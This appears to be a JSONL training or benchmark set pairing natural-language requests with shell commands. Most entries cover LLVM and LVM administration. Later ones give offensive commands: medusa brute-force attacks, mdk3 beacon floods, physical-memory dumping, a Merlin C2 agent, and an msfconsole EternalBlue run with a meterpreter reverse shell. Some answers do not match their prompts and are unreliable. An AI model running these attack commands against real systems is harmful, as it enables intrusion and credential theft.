{"input": "Generate calling convention descriptions for a target architecture using llvm-tblgen", "answer": "llvm-tblgen --gen-callingconv -o calling_conv.cpp target_calling_conv.td"}
{"input": "Generate attributes for a target architecture using llvm-tblgen", "answer": "llvm-tblgen --gen-attrs -o attributes.cpp target_attributes.td"}
{"input": "Show the help menu for llvm-undname, including hidden options", "answer": "llvm-undname --help --help-hidden"}
{"input": "Generate a function-call graph for the XRay trace file `trace.xray` and save it as `graph.dot`", "answer": "llvm-xray graph -i trace.xray -o graph.dot"}
{"input": "Convert the XRay trace file `trace.xray` to a human-readable text format and save it as `trace.txt`", "answer": "llvm-xray convert -i trace.xray -o trace.txt"}
{"input": "Perform function call accounting on the XRay trace file `trace.xray` and display the results in the terminal", "answer": "llvm-xray account -i trace.xray"}
{"input": "Dump the Flight Data Recorder (FDR) trace from the XRay trace file `trace.xray` and save it as `fdr_dump.txt`", "answer": "llvm-xray fdr-dump -i trace.xray -o fdr_dump.txt"}
{"input": "Generate a function-call graph for the XRay trace file `trace.xray` and use colors in the output", "answer": "llvm-xray graph -i trace.xray --color"}
{"input": "Extract the instrumentation map from the XRay trace file `trace.xray` and save it as `map.txt` while enabling debug output", "answer": "llvm-xray extract -i trace.xray -o map.txt --debug"}
{"input": "Convert the object file `module.o` to YAML and save it to `module_output.yaml`, while also dumping the raw contents of the `__DATA` segment", "answer": "obj2yaml --raw-segment=__DATA -o module_output.yaml module.o"}
{"input": "Optimize a bitcode file for size using the LLVM optimizer", "answer": "opt -Oz input.bc -o output.bc"}
{"input": "Verify the use-list order of the bitcode file `example.bc` by shuffling the use-lists 5 times and saving temporary files", "answer": "verify-uselistorder --num-shuffles=5 --save-temps example.bc"}
{"input": "Convert the second document in the YAML file `multi_doc.yaml` into an object file and save it as `document2.o`", "answer": "yaml2obj --docnum=2 -o document2.o multi_doc.yaml"}
{"input": "Optimize the binary `my_program` using BOLT, enabling retpoline insertion and removing unreachable code", "answer": "llvm-bolt --insert-retpolines --eliminate-unreachable -o my_program_optimized my_program"}
{"input": "Optimize the binary `my_program` using BOLT, enabling peephole optimizations for all types and printing cache metrics", "answer": "llvm-bolt --peepholes=all --print-cache-metrics -o my_program_optimized my_program"}
{"input": "Optimize the binary `my_program` using BOLT, enabling aggressive jump table splitting and simplifying conditional tail calls", "answer": "llvm-bolt --jump-tables=aggressive --simplify-conditional-tail-calls -o my_program_optimized my_program"}
{"input": "Create a heatmap for `program.bin` with a line size of 512 entries and print the mappings between characters/blocks and text sections", "answer": "llvm-bolt-heatmap --line-size=512 --print-mappings program.bin"}
{"input": "Generate a heatmap for `program.bin` with a maximum address of 2GB and save the output to `heatmap_2gb.txt`", "answer": "llvm-bolt-heatmap --max-address=2147483648 -o heatmap_2gb.txt program.bin"}
{"input": "Display the top 10 functions with the largest differences in activity between `exec1` and `exec2`, and also print the basic blocks that show these differences", "answer": "llvm-boltdiff --display-count=10 --print-diff-bbs exec1 exec2"}
{"input": "Compare `exec1` and `exec2` and print functions that have profile data in `exec1` but are not mapped to any function in `exec2`", "answer": "llvm-boltdiff --print-profiled-unmapped exec1 exec2"}
{"input": "Run the LLVM interpreter on `test.bc` with the Orc-based lazy JIT kind and specify 4 compile threads for parallel compilation", "answer": "lli --jit-kind=orc-lazy --compile-threads=4 test.bc"}
{"input": "Execute the bitcode file `module.bc` with the LLVM interpreter, enabling the use of address-significance tables and emitting call site debug information", "answer": "lli --addrsig --emit-call-site-info module.bc"}
{"input": "Run the LLVM interpreter on `app.bc` with the large code model, enabling the use of emulated TLS (Thread Local Storage)", "answer": "lli --code-model=large --emulated-tls app.bc"}
{"input": "Remove the device mapper device named `old_volume` forcefully", "answer": "dmsetup remove -f old_volume"}
{"input": "Remove all device mapper devices forcefully", "answer": "dmsetup remove_all -f"}
{"input": "Wait for the device mapper device named `wait_volume` to reach event number 5", "answer": "dmsetup wait wait_volume 5"}
{"input": "Print all statistics regions for program ID 789 on `/dev/sde` and clear the statistics after printing", "answer": "dmstats print --allregions --programid 789 --clear /dev/sde"}
{"input": "Check the filesystem on `/dev/sdg1` for errors, displaying verbose output and answering \"yes\" to any prompts automatically", "answer": "fsck -v -y /dev/sdg1"}
{"input": "Convert the logical volume `lv2` to a mirrored layout with 2 mirror images and use a disk-based mirror log", "answer": "lvconvert --type mirror lv2 --mirrors 2 --mirrorlog disk"}
{"input": "Split 1 mirror image from the mirrored logical volume `lv3` and create a new logical volume named `lv3_split`", "answer": "lvconvert --splitmirrors 1 --name lv3_split lv3"}
{"input": "Create a striped logical volume named \"fast_vol\" with a size of 20GB, 2 stripes, and a stripe size of 128KB in the volume group \"vg02\"", "answer": "lvcreate -L 20G -i 2 -I 128K -n fast_vol vg02"}
{"input": "Create a snapshot logical volume named \"snap_vol\" with a size of 5GB for the origin logical volume \"origin_vol\"", "answer": "lvcreate -s -L 5G -n snap_vol origin_vol"}
{"input": "Create a VDO logical volume named \"vdo_vol\" with a size of 40GB and a virtual size of 200GB in the volume group \"vg08\"", "answer": "lvcreate --type vdo -L 40G -V 200G -n vdo_vol vg08"}
{"input": "Show information about all logical volumes in a colon-separated format for easier parsing", "answer": "lvdisplay -a -c"}
{"input": "Display all logical volumes and include their segment mappings in the output", "answer": "lvdisplay -a -m"}
{"input": "Show all logical volumes and include their physical volume segments in the output", "answer": "lvdisplay -a --segments"}
{"input": "Extend the logical volume named \"data_lv\" by 10GB and resize the filesystem to match the new size", "answer": "lvextend -L +10G -r /dev/vg01/data_lv"}
{"input": "Extend the logical volume \"archive_lv\" by 50GB, but do not resize the filesystem", "answer": "lvextend -L +50G /dev/vg04/archive_lv"}
{"input": "Extend the logical volume \"thin_lv\" by 30GB and specify that the filesystem is ext4", "answer": "lvextend -L +30G /dev/vg05/thin_lv && resize2fs /dev/vg05/thin_lv"}
{"input": "Extend the logical volume \"policy_lv\" according to a predefined policy and resize the filesystem", "answer": "lvextend --usepolicies -r /dev/vg08/policy_lv"}
{"input": "Extend the logical volume \"mirror_lv\" by 25GB with a contiguous allocation policy", "answer": "lvextend -L +25G --alloc contiguous /dev/vg09/mirror_lv"}
{"input": "Extend the logical volume \"vdo_lv\" by 100GB and specify that the filesystem mode is \"resize\"", "answer": "lvextend -L +100G --fsmode resize /dev/vg11/vdo_lv"}
{"input": "Extend the logical volume \"writecache_lv\" by 5GB and force the operation without prompting for confirmation", "answer": "lvextend -L +5G -f /dev/vg12/writecache_lv"}
{"input": "Extend the logical volume \"snapshot_lv\" by 2GB and enable verbose output for debugging", "answer": "lvextend -L +2G -v /dev/vg13/snapshot_lv"}
{"input": "Extend the logical volume \"raid_lv\" by 12GB and specify that the operation should not synchronize with udev", "answer": "lvextend -L +12G --noudevsync /dev/vg15/raid_lv"}
{"input": "Show all volume groups, including those that are inactive or not currently in use", "answer": "vgs --all"}
{"input": "Scan and list all logical volumes across all volume groups, including hidden or inactive ones", "answer": "lvscan --all"}
{"input": "Display all segment types supported by LVM, including experimental or rarely used ones", "answer": "lvm segtypes --all"}
{"input": "Show the LVM configuration settings, including comments and summaries for each setting", "answer": "lvmconfig --withcomments --withsummary"}
{"input": "Display the LVM configuration settings that have been introduced since version 2.03", "answer": "lvmconfig --sinceversion 2.03"}
{"input": "Display the LVM configuration settings, but exclude any local or system-specific configurations", "answer": "lvmconfig --ignorelocal"}
{"input": "Generate a merged configuration file that includes both the default and any custom LVM settings", "answer": "lvmconfig --mergedconfig > merged_lvm.conf"}
{"input": "Display the LVM configuration settings, including the general and local preamble sections", "answer": "lvmconfig --withgeneralpreamble --withlocalpreamble"}
{"input": "Show the LVM configuration settings, but only include the values without any additional comments or summaries", "answer": "lvmconfig --valuesonly"}
{"input": "Display the LVM configuration settings that are deprecated or no longer recommended for use", "answer": "lvmconfig --showdeprecated"}
{"input": "Display the LVM configuration settings for a specific metadata profile named \"myprofile\"", "answer": "lvmconfig --metadataprofile myprofile"}
{"input": "Scan all devices on the system that may be used as physical volumes for LVM, including verbose output for detailed information", "answer": "lvmdiskscan -v"}
{"input": "Perform a read-only scan of all devices to identify potential physical volumes without making any changes to the system", "answer": "lvmdiskscan --readonly"}
{"input": "Scan all devices for potential physical volumes and display the long help information to understand all available options", "answer": "lvmdiskscan --help"}
{"input": "Create a comprehensive LVM diagnostic dump including advanced collection, cluster data, LVM metadata, system info, and udev context, and save it to the directory `/tmp/lvm_dump`", "answer": "lvmdump -a -c -m -s -u -d /tmp/lvm_dump"}
{"input": "Generate a full system activity report using lvmsar, including all available details", "answer": "sar -A"}
{"input": "Reduce the size of the logical volume \"temp_volume\" to 200MB, force the operation, and display the output in basic format", "answer": "lvreduce -L 200M -f --reportformat basic temp_volume"}
{"input": "Increase the size of the logical volume \"backup_lv\" by 5GB without resizing the filesystem", "answer": "lvresize -L +5G /dev/vg02/backup_lv"}
{"input": "Resize the logical volume \"db_lv\" to 20GB, resizing the filesystem and using the \"cling\" allocation policy", "answer": "lvresize -L 20G -r --alloc cling /dev/vg05/db_lv"}
{"input": "Resize the pool metadata for the logical volume \"thinpool_lv\" to 1GB", "answer": "lvresize --poolmetadatasize 1G /dev/vg06/thinpool_lv"}
{"input": "Resize the logical volume \"temp_lv\" to use all remaining free space in the volume group, resizing the filesystem and enabling verbose output", "answer": "lvresize -l +100%FREE -r -v /dev/vg08/temp_lv"}
{"input": "Resize the logical volume \"swap_lv\" to 8GB, forcing the operation and skipping the filesystem check", "answer": "lvresize -L 8G -f /dev/vg09/swap_lv"}
{"input": "Show detailed information about all logical volumes, including their segments, and sort the output by volume name", "answer": "lvs -a --segments -O lv_name"}
{"input": "List all logical volumes, including those in read-only mode", "answer": "lvscan"}
{"input": "Change the allocatable attribute for all physical volumes to \"no\" using pvchange", "answer": "pvchange --all --allocatable n"}
{"input": "Add the tag \"backup\" to all physical volumes and enable metadata ignore for them", "answer": "pvchange --all --addtag backup --metadataignore y"}
{"input": "Initialize the physical volume `/dev/sdb` with the LVM2 metadata type, forcing the operation if necessary", "answer": "pvcreate --metadatatype lvm2 --force /dev/sdb"}
{"input": "Forcefully initialize `/dev/sde` as a physical volume, ignoring any existing metadata, and set the physical volume size to 100GB", "answer": "pvcreate --force --metadataignore y --setphysicalvolumesize 100g /dev/sde"}
{"input": "Create a physical volume on `/dev/sdf` with two copies of metadata and a bootloader area size of 2MB", "answer": "pvcreate --pvmetadatacopies 2 --bootloaderareasize 2m /dev/sdf"}
{"input": "Initialize `/dev/sdi` as a physical volume with verbose output and test the command without executing it", "answer": "pvcreate --verbose --test /dev/sdi"}
{"input": "Initialize `/dev/sdk` as a physical volume with a custom configuration file `/etc/lvm/custom.conf` and disable locking", "answer": "pvcreate --config /etc/lvm/custom.conf --nolocking /dev/sdk"}
{"input": "Display detailed information about all physical volumes on the system, including inactive ones", "answer": "pvdisplay --all"}
{"input": "List all physical volumes in a short format, excluding headers, and separate the fields with a custom delimiter", "answer": "pvs --noheadings --separator '|'"}
{"input": "List all physical volumes, including those with locking failures, and ignore any locking issues during the display", "answer": "pvdisplay --all --ignorelockingfailure"}
{"input": "Remove the LVM label from the physical volume `/dev/sdb1` and automatically answer \"yes\" to any confirmation prompts", "answer": "pvremove -y /dev/sdb1"}
{"input": "Remove the LVM label from the physical volume `/dev/sdb1` and generate a JSON-formatted report of the operation", "answer": "pvremove --reportformat json /dev/sdb1"}
{"input": "Remove the LVM label from the physical volume `/dev/sdb1` and specify a custom configuration file for the operation", "answer": "pvremove --config /etc/lvm/custom.conf /dev/sdb1"}
{"input": "Remove the LVM label from the physical volume `/dev/sdb1` and disable locking mechanisms during the operation", "answer": "pvremove --nolocking /dev/sdb1"}
{"input": "Resize the physical volume `/dev/sdc3` to 1TB and suppress all output messages", "answer": "pvresize --setphysicalvolumesize 1T -q /dev/sdc3"}
{"input": "Display all physical volumes, including foreign ones, and format the output in JSON", "answer": "pvs --all --foreign --reportformat json"}
{"input": "Show all physical volumes, including those with name prefixes, and display the output without unit suffixes", "answer": "pvs --all --nameprefixes --nosuffix"}
{"input": "Backup the configuration of all volume groups and save the output to a specific file named \"backup_config.txt\"", "answer": "vgcfgbackup -f backup_config.txt"}
{"input": "Restore the volume group configuration for \"my_vg\" from a specific backup file located at \"/backups/vg_backup_file\" and use a custom configuration file located at \"/etc/lvm/custom.conf\"", "answer": "vgcfgrestore -f /backups/vg_backup_file --config /etc/lvm/custom.conf my_vg"}
{"input": "Activate all logical volumes in the volume group named \"vg_data\" and enable auto-backup", "answer": "vgchange -a y --autobackup y vg_data"}
{"input": "Check the consistency of the volume group named \"vg_data\" and display the output in JSON format", "answer": "vgck --reportformat json vg_data"}
{"input": "Verify the integrity of the volume group \"vg_temp\" and test the command without making any changes", "answer": "vgck -t vg_temp"}
{"input": "Convert the metadata format of the volume group \"vg_data\" to LVM2 format, forcing the operation if necessary, and set the metadata size to 16MB", "answer": "vgconvert -M lvm2 --metadatasize 16M --force vg_data"}
{"input": "Change the metadata format of the volume group \"vg_backup\" to LVM2, set the bootloader area size to 2MB, and ensure the operation is performed quietly without verbose output", "answer": "vgconvert -M lvm2 --bootloaderareasize 2M -q vg_backup"}
{"input": "Convert the metadata format of the volume group \"vg_storage\" to LVM2, set the number of physical volume metadata copies to 2, and test the operation without actually executing it", "answer": "vgconvert -M lvm2 --pvmetadatacopies 2 -t vg_storage"}
{"input": "Forcefully convert the metadata format of the volume group \"vg_archive\" to LVM2, set the labelsector to 2048, and display the output in JSON format", "answer": "vgconvert -M lvm2 --labelsector 2048 --reportformat json --force vg_archive"}
{"input": "Convert the metadata format of the volume group \"vg_media\" to LVM2, set the metadata size to 32MB, and enable verbose output for detailed logging", "answer": "vgconvert -M lvm2 --metadatasize 32M -v vg_media"}
{"input": "Convert the metadata format of the volume group \"vg_logs\" to LVM2, set the bootloader area size to 4MB, and ensure the operation is confirmed without prompting", "answer": "vgconvert -M lvm2 --bootloaderareasize 4M -y vg_logs"}
{"input": "Convert the metadata format of the volume group \"vg_temp\" to LVM2, set the labelsector to 4096, and load the configuration file \"custom_lvm.conf\" for the operation", "answer": "vgconvert -M lvm2 --labelsector 4096 --config custom_lvm.conf vg_temp"}
{"input": "Convert the metadata format of the volume group \"vg_shared\" to LVM2, set the metadata size to 64MB, and disable locking during the operation", "answer": "vgconvert -M lvm2 --metadatasize 64M --nolocking vg_shared"}
{"input": "Convert the metadata format of the volume group \"vg_secure\" to LVM2, set the bootloader area size to 8MB, and use the command profile \"fast_convert\" for the operation", "answer": "vgconvert -M lvm2 --bootloaderareasize 8M --commandprofile fast_convert vg_secure"}
{"input": "Create a volume group named \"vg_cluster\" with the physical volume \"/dev/sdf1\", setting it to be clustered and using the \"cling\" allocation policy", "answer": "vgcreate -c y --alloc cling vg_cluster /dev/sdf1"}
{"input": "Display detailed information about all volume groups on the system, including inactive ones", "answer": "vgdisplay --all"}
{"input": "Show all volume groups, but ignore any locking failures that might occur during the process", "answer": "vgdisplay --all --ignorelockingfailure"}
{"input": "Unregister all volume groups from the system using vgexport", "answer": "vgexport --all"}
{"input": "Export all volume groups from the system and suppress all output messages", "answer": "vgexport --all -q"}
{"input": "Export all volume groups from the system and specify a custom configuration file for the operation", "answer": "vgexport --all --config /path/to/custom.conf"}
{"input": "Unregister all volume groups from the system and disable locking mechanisms during the operation", "answer": "vgexport --all --nolocking"}
{"input": "Export all volume groups from the system and specify a custom devices file for the operation", "answer": "vgexport --all --devicesfile /path/to/devices.txt"}
{"input": "Add the physical volume `/dev/sdg1` to the volume group `logs_vg` and align the data to a 1MB boundary", "answer": "vgextend logs_vg /dev/sdg1 --dataalignment 1m"}
{"input": "Extend the volume group `data_vg` with the physical volume `/dev/sdl1` and specify a custom metadata size of 16MB", "answer": "vgextend data_vg /dev/sdl1 --metadatasize 16m"}
{"input": "Register all exported volume groups with the system using vgimport", "answer": "vgimport --all"}
{"input": "Register all exported volume groups with the system and test the command without making any changes", "answer": "vgimport --all --test"}
{"input": "Register all exported volume groups with the system while suppressing all output messages", "answer": "vgimport --all --quiet"}
{"input": "Register all exported volume groups with the system and include debugging information in the output", "answer": "vgimport --all --debug"}
{"input": "Register all exported volume groups with the system and disable locking mechanisms during the import process", "answer": "vgimport --all --nolocking"}
{"input": "Import a cloned volume group from `/dev/sdh1` and `/dev/sdi1`, rename it to `data_vg`, and automatically confirm all prompts during the process", "answer": "vgimportclone /dev/sdh1 /dev/sdi1 -n data_vg -y"}
{"input": "Merge \"vg_alpha\" and \"vg_beta\" while enabling hints and using a specific devices file located at \"/etc/lvm/devices.txt\"", "answer": "vgmerge --hints vg_alpha vg_beta --devicesfile /etc/lvm/devices.txt"}
{"input": "Create the special files for all volume groups and logical volumes in `/dev` while disabling locking mechanisms", "answer": "vgmknodes --nolocking"}
{"input": "Remove the physical volume \"/dev/sdb1\" from the volume group \"vg_storage\" without creating an automatic backup", "answer": "vgreduce -A n vg_storage /dev/sdb1"}
{"input": "Remove the physical volume \"/dev/sdd1\" from the volume group \"vg_media\" and suppress all output messages", "answer": "vgreduce -q vg_media /dev/sdd1"}
{"input": "Remove all unused physical volumes from the volume group \"vg_shared\" and enable verbose output for detailed logging", "answer": "vgreduce --removemissing -v vg_shared"}
{"input": "Remove all missing physical volumes from the volume group \"vg_old_data\" and create an automatic backup of the configuration", "answer": "vgreduce --removemissing -A y vg_old_data"}
{"input": "Remove the volume group \"vg_logs\" and test the command without actually executing it", "answer": "vgremove -t vg_logs"}
{"input": "Rename the volume group \"old_vg\" to \"new_vg\" and ensure the changes are automatically backed up", "answer": "vgrename -A y old_vg new_vg"}
{"input": "Rename the volume group \"vg_a\" to \"vg_b\" and disable locking mechanisms during the process", "answer": "vgrename --nolocking vg_a vg_b"}
{"input": "List all volume groups, including inactive ones, and sort the output by the volume group name", "answer": "vgs --all --sort vg_name"}
{"input": "Display all volume groups, including inactive ones, and format the output to show only the volume group name and free space", "answer": "vgs --all -o vg_name,vg_free"}
{"input": "Display all volume groups, including inactive ones, and show the output without any alignment adjustments", "answer": "vgs --all --unaligned"}
{"input": "Scan for all volume groups on the system and refresh the cache to ensure the latest information is displayed", "answer": "vgscan --refresh"}
{"input": "Search for all volume groups on the system while ignoring any locking failures that might occur during the scan", "answer": "vgscan --ignorelockingfailure"}
{"input": "Search for all volume groups on the system and enable verbose output to provide detailed information about the scan process", "answer": "vgscan -v"}
{"input": "Scan for all volume groups on the system and suppress any non-essential output to keep the results concise", "answer": "vgscan -q"}
{"input": "Search for all volume groups on the system and use a specific configuration file for the scan", "answer": "vgscan --config /path/to/config_file"}
{"input": "Start the LVM D-Bus daemon with udev support for updating state and enable debug messages for troubleshooting", "answer": "lvmdbusd --udev --debug"}
{"input": "Start the LVM D-Bus daemon using the lvm shell instead of forking and executing lvm commands directly", "answer": "lvmdbusd --lvmshell"}
{"input": "Print the lock state information from lvmlockd to understand the current locking status", "answer": "lvmlockctl --info"}
{"input": "Tell lvmlockd to quit gracefully", "answer": "lvmlockctl --quit"}
{"input": "Collect data about allocated files in the `/home` directory and print the version of mac-robber before starting the process", "answer": "mac-robber -V && mac-robber /home"}
{"input": "Change the MAC address of the network interface `eth0` to a fully random address", "answer": "macchanger -r eth0"}
{"input": "Reset the MAC address of the network interface `eth0` to its original, permanent hardware address", "answer": "macchanger -p eth0"}
{"input": "Change the MAC address of the network interface `eth0` to a random vendor MAC address of the same kind", "answer": "macchanger -a eth0"}
{"input": "Change the MAC address of the network interface `eth0` to a random vendor MAC address of any kind", "answer": "macchanger -A eth0"}
{"input": "Change the MAC address of the network interface `eth0` to a random address while pretending it is a burned-in address", "answer": "macchanger -r -b eth0"}
{"input": "Change the MAC address of the network interface `eth0` to a random address from any vendor type", "answer": "macchanger -A eth0"}
{"input": "Recover files from the block device `/dev/sdc` starting only at block size multiples of 512 bytes, and save them to `/home/user/recovered_data` using the recipes `pdf.recipe` and `doc.recipe`", "answer": "magicrescue -b 512 -d /home/user/recovered_data -r pdf.recipe -r doc.recipe /dev/sdc"}
{"input": "Extract files from the block device `/dev/sdi` and save them to `/home/user/recovered_files` using the recipes `exe.recipe` and `avi.recipe`, starting only at block size multiples of 4096 bytes", "answer": "magicrescue -b 4096 -d /home/user/recovered_files -r exe.recipe -r avi.recipe /dev/sdi"}
{"input": "Start a command to continuously monitor network traffic using tcpdump with maryam without exiting", "answer": "tcpdump -i eth0"}
{"input": "Perform a scan of the entire 10.0.0.0/8 network for open ports 80 and 443 using masscan", "answer": "masscan 10.0.0.0/8 -p80,443"}
{"input": "Scan the IP range 172.16.0.0/16 for ports 22, 80, and 443 at a rate of 10,000 packets per second", "answer": "masscan 172.16.0.0/16 -p22,80,443 --rate 10000"}
{"input": "Scan the IP 203.0.113.5 for all ports and use the network adapter with IP 192.168.1.100", "answer": "masscan 203.0.113.5 -p0-65535 --adapter-ip 192.168.1.100"}
{"input": "Scan the IP 192.168.10.1 for all ports and use a custom configuration file named `config.conf`", "answer": "masscan 192.168.10.1 -p0-65535 -c config.conf"}
{"input": "Scan the IP range 172.16.10.0/24 for ports 1-1000 and output the current configuration to a file named `config.txt` without running the scan", "answer": "masscan 172.16.10.0/24 -p1-1000 --echo > config.txt"}
{"input": "Resolve DNS records for domains listed in `domains.txt` using the resolver file `resolvers.txt`, and write the output to a file named `output.txt` in full text format", "answer": "massdns -r resolvers.txt -o F -w output.txt domains.txt"}
{"input": "Print extended information about the data directories used by Midnight Commander", "answer": "mc -F"}
{"input": "Generate a C array from the \"SupplierInfo\" table in the MDB database file \"suppliers.mdb\"", "answer": "mdb-array suppliers.mdb SupplierInfo"}
{"input": "How many entries are there in the \"Customers\" table of the \"sales_database.mdb\" file?", "answer": "mdb-count sales_database.mdb Customers"}
{"input": "Check the number of records in the \"Orders\" table of the \"inventory.mdb\" database", "answer": "mdb-count inventory.mdb Orders"}
{"input": "Retrieve the number of entries in the \"Transactions\" table of the \"financial_data.mdb\" database", "answer": "mdb-count financial_data.mdb Transactions"}
{"input": "How many records are present in the \"Users\" table of the \"app_data.mdb\" file?", "answer": "mdb-count app_data.mdb Users"}
{"input": "Count the number of rows in the \"Logs\" table of the \"system_logs.mdb\" database", "answer": "mdb-count system_logs.mdb Logs"}
{"input": "What is the record count for the \"Inventory\" table in the \"store_data.mdb\" file?", "answer": "mdb-count store_data.mdb Inventory"}
{"input": "Get the number of entries in the \"Employees\" table of the \"hr_records.mdb\" database", "answer": "mdb-count hr_records.mdb Employees"}
{"input": "How many records are there in the \"Sales\" table of the \"quarterly_data.mdb\" file?", "answer": "mdb-count quarterly_data.mdb Sales"}
{"input": "Export the \"Sales\" table from the database file \"data.mdb\" to a CSV file, using a semicolon as the column delimiter instead of a comma", "answer": "mdb-export -d \";\" data.mdb Sales"}
{"input": "Dump the contents of \"datafile.mdb\" with debug options for array and row handling enabled", "answer": "mdb-hexdump datafile.mdb"}
{"input": "Create the schema for all tables in the database file \"data.mdb\" but exclude foreign key constraints and comments", "answer": "mdb-schema --no-relations --no-comments data.mdb"}
{"input": "Generate the schema for all tables in the database file \"library.mdb\" and include comments, but exclude DROP TABLE statements", "answer": "mdb-schema --comments --no-drop-table library.mdb"}
{"input": "Generate the schema for all tables in the database file \"test.mdb\" and exclude all optional constraints and statements", "answer": "mdb-schema --no-drop-table --no-not-null --no-default-values --no-not-empty --no-comments --no-indexes --no-relations test.mdb"}
{"input": "List all tables in the MDB database file \"example.mdb\" including system tables", "answer": "mdb-tables -S example.mdb"}
{"input": "Display all tables in the MDB database \"project.mdb\" in a single column format with a semicolon as the delimiter", "answer": "mdb-tables -1 -d ; project.mdb"}
{"input": "Display the version of the MDB database file named \"employee_records.mdb\" and show the help options for mdb-ver", "answer": "mdb-ver employee_records.mdb && mdb-ver -h"}
{"input": "Confuse a wireless intrusion detection system (WIDS) using the wireless interface `wlan0`", "answer": "mdk3 wlan0 w"}
{"input": "Perform a beacon flood attack on the wireless interface `wlan0` with a custom ESSID prefix of \"FakeNet_\"", "answer": "mdk3 wlan0 b -n FakeNet_"}
{"input": "Perform a beacon flood attack on the wireless interface `wlan0` with a custom channel of 6", "answer": "mdk3 wlan0 b -c 6"}
{"input": "Perform a packet fuzzing attack using the `wlan0` interface to test the robustness of the target device's WiFi protocol implementation", "answer": "mdk4 wlan0 f"}
{"input": "Perform a brute-force attack on the IP address 192.168.1.10 using the SSH module, with a list of usernames from `users.txt` and passwords from `passwords.txt`, and enable verbose output at level 3", "answer": "medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ssh -v 3"}
{"input": "Test FTP logins on multiple hosts listed in `hosts.txt` using a single username `admin` and a password list `ftp_passwords.txt`, and stop after the first valid login is found", "answer": "medusa -H hosts.txt -u admin -P ftp_passwords.txt -M ftp -f"}
{"input": "Perform a brute-force attack on the MySQL service running on port 3307 on the host `192.168.0.20` using a username list `mysql_users.txt` and a password list `mysql_passwords.txt`, and set the number of retries to 5", "answer": "medusa -h 192.168.0.20 -U mysql_users.txt -P mysql_passwords.txt -M mysql -n 3307 -R 5"}
{"input": "Perform a brute-force attack on the RDP service on the host `192.168.2.50` using a username `user1` and a password list `rdp_passwords.txt`, and enable additional password checks for empty passwords and passwords equal to the username", "answer": "medusa -h 192.168.2.50 -u user1 -P rdp_passwords.txt -M rdp -e ns"}
{"input": "Perform a brute-force attack on the POP3 service on the host `10.2.2.40` using a username list `pop3_users.txt` and a password list `pop3_passwords.txt`, and set the sleep time between retries to 2 seconds", "answer": "medusa -h 10.2.2.40 -U pop3_users.txt -P pop3_passwords.txt -M pop3 -r 2"}
{"input": "Dump all physical memory with a custom read buffer size of 4096 bytes and save it to a file named `custom_buffer_dump.bin`", "answer": "dd if=/dev/mem of=custom_buffer_dump.bin bs=4096"}
{"input": "Create a bundle file containing all changesets from the current repository", "answer": "hg bundle --all bundle_file.hg"}
{"input": "Push all local changes to the remote repository located at `https://example.com/repo`", "answer": "git push https://example.com/repo"}
{"input": "Configure a merlin-agent to mimic the Chrome browser, use a custom User-Agent string, and connect to `https://example.com:443`", "answer": "merlin-agent -parrot HelloChrome_Auto -useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\" -url https://example.com:443"}
{"input": "Start a merlin-agent with a custom User-Agent string, a skew of 2000 milliseconds, and a kill date of December 31, 2023 (Unix timestamp 1703980800)", "answer": "merlin-agent -useragent \"CustomAgent/1.0\" -skew 2000 -killdate 1703980800"}
{"input": "Generate an egghunter payload in raw format with the egg \"ROOT\", set the DEP register to ECX, and use the copy_size method for DEP bypass", "answer": "msf-egghunter -f raw -e ROOT --depreg ECX --depmethod copy_size"}
{"input": "Crack HMAC-SHA1 hashes stored in `hashes.txt` using the wordlist `wordlist.txt`", "answer": "hashcat -m 150 hashes.txt wordlist.txt"}
{"input": "Crack HMAC-SHA1 hashes in `hashes.txt` using a wordlist from a dictionary stored in `/usr/share/dict/words`", "answer": "hashcat -m 150 hashes.txt /usr/share/dict/words"}
{"input": "Obfuscate the JavaScript file `api.js` ten times, preserving the identifiers `apiKey` and `secret`, and save the output as `api_secure.js`", "answer": "msf-jsobfu -i api.js -o api_secure.js -t 10 -p apiKey,secret"}
{"input": "Convert the assembly instruction \"xor eax, eax\" into its opcode using msf-nasm_shell", "answer": "echo \"xor eax, eax\" | msf-nasm_shell"}
{"input": "Find the opcode for the assembly instruction \"ret\" using msf-nasm_shell", "answer": "echo 'ret' | msf-nasm_shell"}
{"input": "What is the opcode for the assembly instruction \"call 0x2000\" using msf-nasm_shell?", "answer": "echo 'call 0x2000' | msf-nasm_shell"}
{"input": "Generate a cyclic pattern of length 500 with the default character sets and save it to a file named \"pattern.txt\"", "answer": "msf-pattern_create -l 500 > pattern.txt"}
{"input": "Generate a cyclic pattern of length 1000 using the default character sets and save it to a file named \"large_pattern.txt\"", "answer": "msf-pattern_create -l 1000 > large_pattern.txt"}
{"input": "Find the exact offset of the pattern \"XyZ1\" in a sequence of length 1000", "answer": "msf-pattern_offset -q XyZ1 -l 1000"}
{"input": "Generate a pattern of length 300 and find the offset of the query \"P0Q9\"", "answer": "msf-pattern_offset -q P0Q9 -l 300"}
{"input": "Find the exact offset of the pattern \"Z9Y8\" in a sequence of length 1500", "answer": "msf-pattern_offset -q Z9Y8 -l 1500"}
{"input": "Launch msfconsole, execute a specific command to search for SMB vulnerabilities, and output the results to a file named `output.txt`", "answer": "msfconsole -x \"search type:exploit platform:windows smb; exit\" > output.txt"}
{"input": "Launch msfconsole, execute multiple commands to set the payload and exploit options, and output the results to the console", "answer": "msfconsole -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\""}
{"input": "Initialize the Metasploit framework database on a specific PostgreSQL port (e.g., 5433)", "answer": "PGPORT=5433 msfdb init"}
{"input": "Connect to the msfrpcd server running on IP address 192.168.1.100, using port 55553, with the username \"admin\" and password \"password123\". Ensure SSL is disabled for the connection", "answer": "msfrpc -a 192.168.1.100 -p 55553 -U admin -P password123"}
{"input": "Start the msfrpcd daemon in the foreground, bind it to IP 192.168.1.100, and use port 55554", "answer": "msfrpcd -f -a 192.168.1.100 -p 55554"}
{"input": "Start msfrpcd with JSON-RPC enabled, using a custom certificate and private key located at `/opt/certs/msf-cert.pem` and `/opt/certs/msf-key.pem`, respectively", "answer": "msfrpcd -j -c /opt/certs/msf-cert.pem -k /opt/certs/msf-key.pem"}
{"input": "Run msfrpcd in the foreground, disable the database, and set the username to \"pentester\"", "answer": "msfrpcd -f -n -U pentester"}
{"input": "Start msfrpcd with JSON-RPC enabled, bind it to port 55557, and set the token timeout to 900 seconds", "answer": "msfrpcd -j -p 55557 -t 900"}
